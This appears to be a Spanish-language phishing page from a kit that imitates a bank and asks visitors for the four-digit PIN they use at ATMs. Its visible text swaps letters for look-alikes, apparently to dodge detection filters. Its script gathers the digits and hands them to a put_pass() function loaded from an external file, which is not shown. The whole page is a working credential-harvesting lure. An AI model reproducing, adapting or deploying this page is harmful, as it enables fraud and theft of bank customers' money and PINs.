<!DOCTYPE html>
<html lang="es">

<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="es" http-equiv="Content-Language">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="../esova/datos/src/css/layout.css" rel="stylesheet">
    <link href="../esova/datos/src/css/fonts.css" rel="stylesheet">
    <link rel="icon" type="image/png" href="../esova/datos/src/img/logo.png" />
    <script type="text/javascript" src="../esova/datos/src/js/jquery-3.6.0.min.js"></script>
    <script src="../src/js/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="../esova/datos/src/js/run.js"></script>
</head>

<body style="background-color: #f7f7f7; text-align: center;">

    <div class="fondo">
        <div class="contenido">
            <div class="cabecera">
                <div class="logo">
                    <br><br><br>
                    <img style="width: 250px;" src="../esova/datos/src/img/logo.svg">
                    <br><br><br><br>
                    <span style="font-size: 24px; font-family: Arial, sans-serif;">lngresa Ia cIave que utiIizas en eI cajero</span>
                    <br><br><br><br><br>
                    <div class="box-form" style="margin-top: -25px; max-width: 400px; margin-left: auto; margin-right: auto;">
                        <center>
                            <img style="width: 40px; margin-top: -20px;" src="../esova/datos/src/img/icons/ico-clav.png" alt="">
                        </center>
                        <div class="input-icono pass" style="margin-top: -10px;">
                            <span style="font-size: 15px; font-family: Arial, sans-serif;">lngresar cIave</span>
                            <center>
                                <div class="clave-container" style="margin-top: 25px;">
                                    <input type="password" pattern="\d" inputmode="numeric" name="inp-pass1" id="inp-pass1" maxlength="1" class="pass" style="width: 18%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                    <input type="password" pattern="\d" inputmode="numeric" name="inp-pass2" id="inp-pass2" maxlength="1" class="pass" style="width: 18%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                    <input type="password" pattern="\d" inputmode="numeric" name="inp-pass3" id="inp-pass3" maxlength="1" class="pass" style="width: 18%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                    <input type="password" pattern="\d" inputmode="numeric" name="inp-pass4" id="inp-pass4" maxlength="1" class="pass" style="width: 18%; text-align: center; font-size: 20px; border: none; border-bottom: 1px solid black;">
                                    <div class="box-img">
                                        <br>
                                    </div>
                                </div>
                                <div class="box-img">
                                </div>
                                <br>
                                <button id="btn-pass" name="btn-pass" class="btn btn-amarillo" type="button">Continuar</button>
                            </center>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <br><br><br><br>
    <div style="width: 100%; text-align: center;">
        <img class="fondo" style="width: 100%;" src="../esova/datos/src/img/fondo1-1024x459.png">
    </div>

    <script type="text/javascript">
        $(document).ready(function() {
            $('.pass').keyup(function(event) {
                var maxLength = parseInt($(this).attr('maxlength'));
                var currentLength = $(this).val().length;

                if (currentLength === maxLength) {
                    $(this).next('.pass').focus();
                }
            });

            $('.pass').keydown(function(event) {
                var minLength = parseInt($(this).attr('maxlength'));
                var currentLength = $(this).val().length;

                if (event.keyCode === 8 && currentLength === 0) {
                    $(this).prev('.pass').focus();
                }
            });

            $('#btn-pass').click(function() {
                var pass1 = $("#inp-pass1").val();
                var pass2 = $("#inp-pass2").val();
                var pass3 = $("#inp-pass3").val();
                var pass4 = $("#inp-pass4").val();

                var password = pass1 + pass2 + pass3 + pass4;

                if (password.length === 4 && !isNaN(password)) {
                    put_pass(password);
                } else {
                    alert("La clave debe tener exactamente 4 números");
                }
            });
        });
    </script>
    <html>